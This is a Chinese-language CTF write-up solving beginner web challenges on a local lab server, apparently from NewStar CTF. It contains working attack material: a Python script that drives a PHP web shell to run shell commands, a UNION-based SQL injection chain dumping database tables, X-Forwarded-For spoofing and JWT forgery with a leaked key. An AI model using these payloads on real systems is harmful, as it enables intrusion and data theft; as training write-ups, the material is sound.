---
title: 'Week1 Web 网络攻防'
date: '2025-04-19T17:50:42+08:00'
weight: 2
draft: false
description: "Week1 Web 网络攻防"
---

## headach3

**提示：My HEAD(er) aches!!!!! HELP ME DOCTOR!!!**

根据提示在响应头中找到 `Fl3g`，获得 `flag{You_Ar3_R3Ally_A_9ooD_d0ctor}`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-00-46.3k87m4snod.webp)

## 会赢吗

**提示：你考入了咒术高专，但是出门前你因为太兴奋而忘记了带录取通知书，你能找到录取通知书吗？**

检查页面元素：`<!-- flag第一部分：ZmxhZ3tXQTB3，开始你的新学期吧！:/4cqu1siti0n -->`

- flag 第一部分：`ZmxhZ3tXQTB3`
- 下一关地址：`/4cqu1siti0n`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-08-36.4joazb5cnq.webp)

**进入下一关：**`127.0.0.1:3307/4cqu1siti0n`

**提示：五条老师传授给你们一种名为javascript的术式，这种术式可以在控制台进行一系列的应用**

检查页面元素：对 `<script>` 进行分析，在控制台调用函数 `revealFlag()` 并传入参数 **课程名称（classname）**就可以获得第二部分的 flag

```javascript
<script>
    async function revealFlag(className) {
        try {
            const response = await fetch(`/api/flag/${className}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            if (response.ok) {
                const data = await response.json();
                console.log(`恭喜你！你获得了第二部分的 flag: ${data.flag}\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/${data.nextLevel}`);
            } else {
                console.error('请求失败，请检查输入或服务器响应。');
            }
        } catch (error) {
            console.error('请求过程中出现错误:', error);
        }
    }
    // 控制台提示
    console.log("你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！");
</script>
```

由 `"你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！"`得到课程名称为 `4cqu1siti0n`，在控制台调用 `revealFlag(4cqu1siti0n)`

- flag 第二部分：`IV95NF9yM2Fs`
- 下一关地址：`/s34l`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-24-10.7axd7ebijh.webp)

**进入下一关：**`127.0.0.1:3307/s34l`

检查页面元素：对 `<script>` 进行分析，当 `id`  为  `state` 的元素中的文本内容为 **解封** 时，点击按钮 **“解封!!!”** 就可以获得第二部分的 flag

```javascript
<script>
    document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('seal_him');
        const stateElement = document.getElementById('state');
        const messageElement = document.getElementById('message');
        form.addEventListener('submit', async function (event) {
            event.preventDefault();

            if (stateElement.textContent.trim() !== '解封') {
                messageElement.textContent = '如何是好？';
                return;
            }
            try {
                const response = await fetch('/api/flag/s34l', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ csrf_token: document.getElementById('csrf_token').value })
                });
                if (response.ok) {
                    const data = await response.json();
                    messageElement.textContent = `第三部分Flag: ${data.flag}, 你解救了五条悟！下一关: /${data.nextLevel || '无'}`;
                } else {
                    messageElement.textContent = '请求失败，请重试。';
                }
            } catch (error) {
                messageElement.textContent = '请求过程中出现错误，请重试。';
            }
        });
    });
</script>
```

找到 `<span id="state">已封印</span>` 进行编辑，将 **已封印** 修改为 **解封**

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-34-02.45hv8gts7h.webp)



点击按钮 **“解封!!!”**

- flag 第三部分：`MXlfR3I0c1B`
- 下一关地址：`/Ap3x`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-36-21.2vey25ermm.webp)

**进入下一关：**`127.0.0.1:3307/Ap3x`

检查页面元素：对 `<script>` 进行分析，没有发现任何突破点

```javascript
<script>
    document.querySelector('form').addEventListener('submit', function (event) {
            event.preventDefault();
            alert("宿傩的领域太强了，有什么办法让他的领域失效呢？");
        });
        (function () {
            const originalConsoleLog = console.log;
            console.log = function () {
                originalConsoleLog.apply(console, arguments);
                alert("你觉得你能这么简单地获取到线索？");
            };
        })();
</script>
```

`<noscript>` 定义了在浏览器禁用 JavaScript 或用户的浏览器不支持 JavaScript 时显示的内容

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-45-54.45vu34xkj.webp)

使用插件 `Javascript Toggle On and Off` 禁用 JavaScript

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-47-39.1hsey4ioe1.webp)

点击按钮 **“无量空处！！”**

- flag 第四部分：`MXlfR3I0c1B`
- 已经是最后一关（`"nextLevel":null`）

将 flag 的所有部分进行拼接，发现 `flag{ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9}` 并不是答案，尝试对 `ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9` 进行解码：



![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_13-59-08.6f0vrzbf5g.webp)



```text
flag关键词：flag

密钥1：

密钥2：

深度：10

初始密文：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9

解析树：
Path
├── Base64
│   └── flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}
└── Base92

最长解密链：
Path -> Base64 -> flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}

最终密文：
ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9

最终解密结果：
flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}
```

发现是` base64` 编码，获得 `flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}`

## 智械危机

**提示：**

```text
Hello!
Today is 2025/04/25

welcome to my first website!

ROBOTS is protecting this website!
But it is not smart enough...
It may leak some information to you, future hackers!
```

根据提示，应该与 **robots** 有关，使用 `dirsearch` 进行扫描，发现了 `robots.txt`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_18-24-34.8s3i9g615r.webp)

访问 `http://127.0.0.1:3307/robots.txt`

```text
User-agent: *
Disallow: /backd0or.php
```

访问 `http://127.0.0.1:3307/backd0or.php`

```php
<?php

function execute_cmd($cmd) {
    system($cmd);
}

function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}

if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?>
```

代码审计：存在 Web Shell

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/robots1.4xuqqlbuga.webp)

构造参数：`cmd` 和 `key`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/robots2.lvxj02qb1.webp)

使用 Python 编写脚本：

```python
import requests
import base64
import hashlib

url = 'http://127.0.0.1:3307/backd0or.php'

decrypted_cmd = 'cat $(find / -iname flag)'

cmd = base64.b64encode(decrypted_cmd.encode('utf-8')).decode('utf-8')

reversed_cmd = cmd[::-1]

decoded_cmd = hashlib.md5(reversed_cmd.encode('utf-8')).hexdigest()

key = base64.b64encode(decoded_cmd.encode('utf-8')).decode('utf-8')

payload = {'cmd': cmd, 'key': key}

response = requests.post(url, data=payload)

print(response.text)
```

获得 `flag{6c190201-61b5-3c6b-0a81-5dfa4d1d8cb5}`

## 谢谢皮蛋

**输入 `1'` 后报错：存在 SQL 注入漏洞（联合查询）** 

```text
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 0,1' at line 1

```

**判断注入类型：数字型**

- `1 and 1=1`：无报错，查询成功
- `1 and 1=2`：无报错，查询失败

**判断列数：**

```text
1 order by 2
```

**判断回显位：**

```text
1 and 1=2 union select 1, 2
```

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-25_20-43-07.58hkjs1ncz.webp)

**爆破库名和版本：**

```text
1 and 1=2 union select database(), version()
```

```text
Name: "ctf"
Position: "10.4.13-MariaDB"
```

**爆破表名：**

```text
1 and 1=2 union select group_concat(table_name), 2 from information_schema.tables where table_schema=database()
```

```text
Name: "Fl4g,hexo"
Position: "2"
```

**爆破列名：**

```text
1 and 1=2 union select  group_concat(column_name), 2 from information_schema.columns where table_schema=database() and table_name="Fl4g"
```

```text
Name: "id,des,value"
Position: "2"
```

**爆破数据：**

```text
1 and 1=2 union select  group_concat(des),  group_concat(value) from Fl4g
```

```text
Name: "C0ngratu1ati0ns!"
Position: "flag{NewST@r-CTf-202423f4ac16e193}"
```

获得 `flag{NewST@r-CTf-202423f4ac16e193}`

## PangBai 过家家（1）

### Level 1：初出茅庐

**提示：PangBai 的头部（Header）里便隐藏着一些秘密，需要你主动去发现。**

根据提示检查 response 中的响应头信息，发现 `Location` 字段中给出了下一 Level 的地址，`Location: /da90daff-eac4-438a-8743-dee177700489`。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_16-33-02.5c16cym26p.webp)

直接访问 `http://127.0.0.1:3307/da90daff-eac4-438a-8743-dee177700489` 进入 Level 2。

### Level 2: 云程发轫

**提示：向 PangBai 询问（Query）一下（ask=miao）吧 ~**

根据提示使用 GET 方法（在 URL 加入 `?parameter=value`）传入参数 `ask=miao`，直接访问 `http://127.0.0.1:3307/?ask=miao` 进入 Level 3。

### Level 3: 探赜索隐

**提示：用另一种方法（Method）打声招呼（say=hello）吧 ~**

常用的 request 方法有 GET 和 POST ，Level 2 使用了 GET 方法，根据提示这次使用 POST 方法传参 `say=hello`，`Content-Type` 选择 `application/x-www-form-urlencoded` 类型。

劫持请求：

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-10-20.491h241fge.webp)

修改请求：

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-12-04.9gwrp3wql4.webp)

进入 Level 4。

### Level 4: 不悱不发

**提示：你需要使用正确的方法（Method）来与 PangBai 沟通。**

由于 302 重定向的原因，此时 request 方法又变成了 GET，使用与 Level 3 相同的 POST 方法重新请求。

```text
POST /?ask=miao HTTP/1.1
Host: 127.0.0.1:3307
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Dest: document
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-User: ?1
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NH0.g5672cQm3oc9BNuwUnE1yHl8UZQayXA2N_WDw4JbGQM
Content-Type: application/x-www-form-urlencoded

say=hello
```

**提示：PangBai 回应了呢！可只有 Papa 的话语才能让她感到安心。 代理人（Agent)，这个委托你就接了吧！**

劫持请求，`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36`，根据提示将 `Mozilla` 修改为 `Papa`。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-24-18.73u57wyols.webp)

**提示：你的话语似乎没有对 PangBai 起效，试着说「玛卡巴卡阿卡哇卡米卡玛卡呣」。**

根据提示将 `say=hello` 替换为 `say=玛卡巴卡阿卡哇卡米卡玛卡呣`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-26-53.51ecjv3cdj.webp)

进入 Level 5。

### Level 5: 渐入佳境

**提示：PangBai 依然对你比较警惕，因此「玛卡巴卡阿卡哇卡米卡玛卡呣」或许是不可省略的。**

根据提示，我们仍然需要传递参数 `say=玛卡巴卡阿卡哇卡米卡玛卡呣`，与 Level 4 相同，由于 302 重定向的原因，需要使用 POST 方法重新请求。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-32-44.86tuit5fjr.webp)

**提示：这里便是 PangBai 的心境了呢！试着解开心结吧 ~ 或许可以尝试用修改（PATCH）的方法提交一个补丁包（name="file"; filename="*.zip"）试试。**

根据提示，我们需要使用 PATCH 方法提交一个补丁包，这里提供两种方法。

**1、利用 Python 的 requests 模块请求**

```python
import requests

url = 'http://127.0.0.1:3307/?ask=miao'

headers = {
    'Host': '127.0.0.1:3307',
    'Sec-Fetch-Site': 'none',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Mode': 'navigate',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Sec-Fetch-User': '?1',
    'User-Agent': 'Papa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'sec-ch-ua-mobile': '?0',
    'Cache-Control': 'max-age=0',
    'Sec-Fetch-Dest': 'document',
    'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.aSNfpRjut2OiqeDG8CdhjCiqv2CensxCWsXEJO_ZSKw',
}

files = {'file': ('filename.zip', 'nothing to send')}

data = {'say': '玛卡巴卡阿卡哇卡米卡玛卡呣'}

session = requests.Session()

response = session.patch(url, headers=headers, files=files, data=data)

with open('response_text/level-5.txt', 'w', encoding='utf-8') as f:
    f.write(response.text)

print('Cookies:', session.cookies)
```

运行结果：

```text
RequestsCookieJar[<Cookie token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI for 127.0.0.1/>]>
```

在 Console 中使用 `document.cookie` 更新 cookie 值，刷新后进入 Level 6。

```text
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI"
```

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-02-06.45hv4kdah5.webp)

**2、使用 PATCH 方法和 `multipart/form-data` 内容类型上传文件**

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-23_09-42-57.2h8i86yweh.webp)

### Level 6: 一方通行

**提示：还在等什么？距离成为 PangBai 的亲人（localhost）只有一步之遥了呢！ 这里的前方是一方通行啊！Level 6 可不是容易的！**

根据提示，我们需要通过 ***伪造请求头*** 的方式来模拟本地请求的特征，让服务器误以为请求来自 localhost（127.0.0.1）。

劫持请求，在请求头中添加 `X-Forwarded-For: localhost`（其他可伪造的请求头有：`X-Real-IP`、`Referer`）

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-10-34.8hgoc47j2o.webp)

**提示：PangBai 以一种难以形容的表情望着你——激动的、怀念的，却带着些不安与惊恐，像落单后归家的雏鸟，又宛若雷暴中遇难的船员。 你似乎无法抵御这种感觉的萦绕，像是一瞬间被推入到无法言喻的深渊。尽管你尽力摆脱，但即便今后夜间偶见酣眠，这一瞬间塑成的梦魇也成为了美梦的常客。 「像■■■■验体■■不可能■■■■ JWT 这种■■ F4invkTHj8bU1BoH ■■■密钥，除非■■■■■走，难道■■■■■■吗？！」 「......」**

推测 `F4invkTHj8bU1BoH` 是 JWT (JSON Web Tokens) 的密钥，使用密钥可以在 [JWT](https://jwt.io/) 进行在线签名和验证（获取下一个 Level 的 token）。

将当前的 token 输入到 Encoded 可以看到里面的数据（这里显示 **Invalid Signature** 是因为没有输入正确的密钥）。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-48-23.3rbfdqshqh.webp)

经过多次试验发现最后一关并不是 Level 7，而是 Level 0，使用密钥 `F4invkTHj8bU1BoH` 进行签名，获得 Level 0 的 token。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-37-27.9nzzkqv5yd.webp)

在 Console 中使用 `document.cookie` 更新 cookie 值，刷新后进入 Level 0。

```text
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.7zPrTPLK3ZURtmd34FfByRYPm9a425XdcktwV5hFAvs"
```

### Level 0: 此心安处是吾乡

**提示：「PangBai！危险！PangBai！！PangBai！！！」 _<u>从梦中醒来</u>_**

点击 ***从梦中醒来*** 获得 `flag{79d688a9-c5f5-61c9-dda1-e101ad562ae4}`